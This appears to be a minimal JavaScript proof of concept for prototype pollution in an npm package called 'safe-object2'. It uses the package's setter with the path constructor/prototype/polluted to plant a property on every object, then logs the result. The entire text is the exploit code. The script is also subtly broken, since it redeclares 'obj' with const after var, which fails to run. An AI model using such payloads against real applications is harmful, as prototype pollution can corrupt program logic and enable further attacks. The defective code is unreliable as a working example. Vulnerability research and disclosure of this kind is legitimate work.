var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const safeObj2 = require('safe-object2');
const obj = safeObj2(obj);
console.log({}.polluted);
obj.setter([
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);